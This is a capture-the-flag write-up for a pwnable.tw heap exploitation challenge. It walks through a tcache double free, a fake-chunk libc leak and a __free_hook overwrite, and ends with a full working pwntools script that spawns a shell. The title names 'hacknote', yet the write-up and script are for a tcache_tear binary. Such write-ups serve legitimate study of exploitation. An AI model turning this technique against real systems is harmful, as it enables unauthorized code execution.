# pwnable.tw - hacknote

Original challenge link: https://pwnable.tw/challenge/#33

##  Overview

We can enter a name, and can malloc upto 0xff bytes, and free the pointer. We are limited to handling 1 heap pointer only. However, as the glibc version is old, it has no protection for double free on tcache chunks. It asks for malloc size, and reads input_size-0x10 number of bytes. This results in integer underflow and it reading very large number of bytes, giving us buffer/heap overflow. 


## Exploit
A bit of tcache info is mentioned [here](../tcache%20notes.md).

First we need to leak some sort of heap address. Its full relro, so we can't overwrite GOT. The goal becomes to write a libc address in the bss address where name is stored.

First, we use double free to inject arbitrary address in tcache - 
```py
malloc(20) # def malloc(size, content=b"x")
free()
free()
malloc(20, p64(name_ptr))
malloc(20)
malloc(20, b"overwrite_name!!")
```
Let's say the first malloc(20) got allotted addr A. free() will put addr A in tcache 0x20 bin. The next free will again put addr A in tcache 0x20 bin, and *A will have address of itself (linked list logic).

Now when we malloc, we get allotted addr A, but tcache still has an entry to A. When we write something at A, tcache will parse it as next address in the freed chunks linked list. So when we write name_ptr at that address, we basically make tcache like this - 
```
0x20 Bin -> A -> (name_ptr)
```
If you malloc twice now, you will get name_ptr as return addr of malloc, and our given data will be written there.

With this we have write what where primitive. We also have almost no limit to write size due to integer underflow if we specify size < 16. 

To get a libc leak, we focus on the fact that when a tcache eligible chunk is freed, it gets a heap pointer to tcache struct written in it. But when an unsorted bin eligible chunk is freed, glibc writes a pointer to main_arena there, giving us a relative libc address. 

But for free() to put a chunk in unsorted bin, it has to be atleast > 1032 bytes in size. Since we can't malloc that big chunk, we use our overflow primitve to create a fake chunk within name location in bss, so that when free is called on that chunk, a libc address is placed there, and we can print it.


```py
malloc(10, flat(
    p64(0x0),                   #name
    p64(0x421),                 #name+8
    b"A"*0x18,                  #fill remaining name
    p64(name_ptr+16),           #bss malloc saved ptr
    b'A' * (0x410-0x18-8),      #fill remaining big chunk
    p64(0),                     #padding 
    p64(0x21),                  #next chunk size
    b'B' * 0x10,                #next chunk content
    p64(0),                     #oadding
    p64(0x21)                   #next chunk in use bit set
))
```
This gets overwritten at name_loc, and we carefully set current chunk pointer to name+16. free goes to name+16, reads metadata bytes before it claiming it to be 0x421 byte long chunk, it goes name+0x420, and reads metadata. Prev chunk flag has to be set and next chunk also should be a valid chunk, so we set a final terminating header.

|Address|Content	|Purpose|
|-------|-----------|------------------|
0x602068|	p64(0x421)|	Fake Chunk 1 Size: The chunk to be freed into the unsorted bin.
...	...	|(padding)|
0x602488|	p64(0x21)|	Terminator Chunk 1 Size: Marks Fake Chunk 1 as "in use".
0x6024a8|	p64(0x21)|	Terminator Chunk 2 Size: Marks Terminator Chunk 1 as "in use". 

```py
free()
p.sendlineafter(b"choice :", b"3")
p.recvuntil(b":")
p.recv(0x10)
libc.address = u64(p.recv(8))-0x3ebca0
```
This gives us libc leak when chunk is freed. So now, we can just overwrite __free_hook with system, since we control which pointer is passed to free().

```py
malloc(50)
free()
free()
malloc(50, p64(libc.sym["__free_hook"]))
malloc(50)
malloc(50, p64(libc.sym.system))
```

Finally, we create a heap pointer with /bin/sh, and pass it to free and get the shell- 
```py
malloc(80, "/bin/sh;")
free()
```


## Solve Script
```py
from pwn import *
import time
exe = ELF("./tcache_tear_patched")
libc = ELF("./libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = 'debug'
context.terminal = ['wt.exe', 'wsl.exe', '-d', 'kali-linux']

def conn():
    if args.REMOTE:
        return remote("chall.pwnable.tw", 10207)
    r = process([exe.path])
    if args.GDB:
        gdb.attach(r)
        time.sleep(2)
    return r

p = conn()
name_ptr = 0x602060
def malloc(size, content=b"x"):
    p.sendlineafter(b"choice :", b"1")
    p.sendafter(b"Size:", str(size).encode())
    p.sendafter(b"Data:", content)

def free():
    p.sendlineafter(b"choice :", b"2")

#p.sendline(p64(0x0)+p64(0x421))
p.sendline(b"abc")
malloc(20)
free()
free()
malloc(20, p64(name_ptr))
malloc(20)

malloc(10, flat(
    p64(0x0),
    p64(0x421),
    b"A"*0x18,
    p64(name_ptr+16),
    b'A' * (0x410-0x18-8),
    p64(0),
    p64(0x21),
    b'B' * 0x10,
    p64(0),
    p64(0x21)
))
free()
p.sendlineafter(b"choice :", b"3")
p.recvuntil(b":")
p.recv(0x10)
libc.address = u64(p.recv(8))-0x3ebca0

malloc(50)
free()
free()
malloc(50, p64(libc.sym["__free_hook"]))
malloc(50)
malloc(50, p64(libc.sym.system))


malloc(80, "/bin/sh;")
free()

p.interactive()

```